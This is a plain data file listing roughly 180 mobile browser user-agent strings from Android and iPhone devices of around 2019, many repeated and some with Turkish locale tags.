Mozilla/5.0 (Linux; Android 8.0.0; RNE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; TA-1020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.2; Venus_V3_5010 Build/2.35.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; SM-G611FF) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J500F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.1.2; GT-I8552 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; GT-I9060I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; C6903) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.0; SM-N9000Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; Mi MIX 2 Build/OPR1.170623.027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/605.1
Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B202 Safari/604.1
Mozilla/5.0 (Linux; Android 7.0; SM-A710F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-N920C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.0.0; ASUS_Z012D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; GM8 go) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-G531F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J500F Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/605.1
Mozilla/5.0 (Linux; Android 8.1.0; SM-P580) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-A605F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; MRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX1 Build/HUAWEIANE-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-N935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-H815) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; Venus_V3_5010 Build/VDL371; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.81 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-H815 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.0.4; tr-tr; Turkcell Maxi Plus 5 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
Mozilla/5.0 (Linux; Android 4.4.4; GT-I9060I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/78.0.257670029 Mobile/16F203 Safari/604.1
Mozilla/5.0 (Android 9; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0
Mozilla/5.0 (Linux; Android 6.0.1; LG-H850) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; GT-N5105 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36
Mozilla/5.0 (Linux; Android 9; POT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-A700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.0.4; tr-tr; Turkcell Maxi Plus 5 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-N935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J200H Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; RNE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 6.0.1; Venus_V3_5040) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; MI 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; G3221) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; GM 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-G900FQ Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; GT-N7100) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/74.1.250942683 Mobile/15E148 Safari/605.1
Mozilla/5.0 (Linux; Android 8.1.0; SM-A260G Build/OPR6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; DRA-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-J710FQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-J710FQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-A700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; Venus_V3_5010 Build/VDL371; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.81 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/605.1
Mozilla/5.0 (Linux; Android 8.1.0; Plus-7_C777) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; GT-I9515 Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/605.1
Mozilla/5.0 (Linux; Android 4.4.4; Casper_VIA_V6 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; LG-M700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J500F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; E6603) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; ASUS_Z010D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1.1; SM-J320H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 7.0; SM-N920C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; LG-K520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; GT-I9060I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; SM-T110 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; LG-D693TR Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-A800I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; tr-tr; SAMSUNG GT-I9301Q Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; VIA_A1_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-A700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; Mi A2 Lite Build/PKQ1.180917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-H542 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36
Mozilla/5.0 (Linux; U; Android 5.0; tr-tr; LG-D855 Build/LRX21R.A1445947622) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A456 Safari/602.1
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 7.1.1; E6633) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; LDN-L01 Build/HUAWEILDN-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-H542 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-N920C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; G3221) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; VFD 600) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G920F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; ATU-L21 Build/HUAWEIATU-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; E6603) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G920F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; GT-I9060) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; GM 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-N920C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J600F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; Venus_V3_5570) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; tr-tr; SAMSUNG GT-I9301Q Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Android 6.0.1; Mobile; rv:66.0) Gecko/66.0 Firefox/66.0
Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; Venus_V4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; G3311) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J200F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J500F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; MI MAX 2 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
